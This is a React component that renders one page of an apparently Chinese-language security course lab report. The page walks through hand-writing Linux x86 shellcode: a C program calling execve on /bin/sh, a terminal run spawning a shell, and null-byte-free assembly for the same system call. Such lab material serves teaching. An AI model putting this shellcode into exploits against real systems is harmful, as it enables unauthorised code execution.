import React from 'react';
import { A4Page, KaliTerminal, CodeBlock } from '../shared';

// 实验三 第三部分 - 实验步骤开始
export const Lab3Part3: React.FC = () => (
    <A4Page id="lab3-part3">
        <h3 className="text-base font-bold mb-3">三、实验步骤</h3>
        
        <p className="text-sm mb-2 font-bold">方法1：手动编写 Shellcode</p>
        <p className="text-sm mb-3 text-justify leading-relaxed indent-8">
            本方法的主要思路是：首先编写一个使用 execve 系统调用的 C 语言程序，
            然后通过反汇编分析其汇编代码，最后根据分析结果手动编写精简的汇编代码并提取机器码。
        </p>

        <p className="text-sm mb-2">步骤1：编写使用 execve 的 C 语言程序</p>
        <CodeBlock title="shellcode.c" language="C">
{`#include <stdio.h>
#include <unistd.h>

int main(int argc, char* argv[]) {
    execve("/bin/sh", 0, 0);
    return 0;
}`}
        </CodeBlock>

        <p className="text-sm mb-2">步骤2：编译并测试程序</p>
        <KaliTerminal>
{`┌──(kali㉿kali)-[~/lab3]
└─$ gcc -m32 shellcode.c -o shellcode
┌──(kali㉿kali)-[~/lab3]
└─$ ./shellcode
$ whoami
kali
$ exit`}
        </KaliTerminal>

        <p className="text-sm mb-3 text-justify leading-relaxed indent-8">
            程序成功执行 execve 系统调用，获取了一个可交互的 shell 环境。
        </p>

        <p className="text-sm mb-2">步骤3：编写汇编代码</p>
        <p className="text-sm mb-3 text-justify leading-relaxed indent-8">
            根据 execve 系统调用的要求，我们编写精简的汇编代码。为了避免 shellcode 中出现 NULL 字节，
            我们使用 xor 指令来清零寄存器，使用 push 指令将字符串压入栈中。
        </p>

        <CodeBlock title="shellcode.asm" language="x86 Assembly">
{`SECTION .text
global _start

_start:
    xor ecx, ecx        ; ECX = 0 (argv = NULL)
    xor edx, edx        ; EDX = 0 (envp = NULL)
    push edx            ; 压入 NULL 作为字符串结束符
    push 0x68732f2f     ; 压入 "//sh"
    push 0x6e69622f     ; 压入 "/bin"
    mov ebx, esp        ; EBX = 字符串地址
    xor eax, eax        ; 清零 EAX
    mov al, 0Bh         ; EAX = 11 (execve 系统调用号)
    int 80h             ; 执行系统调用`}
        </CodeBlock>
    </A4Page>
);

export default Lab3Part3;
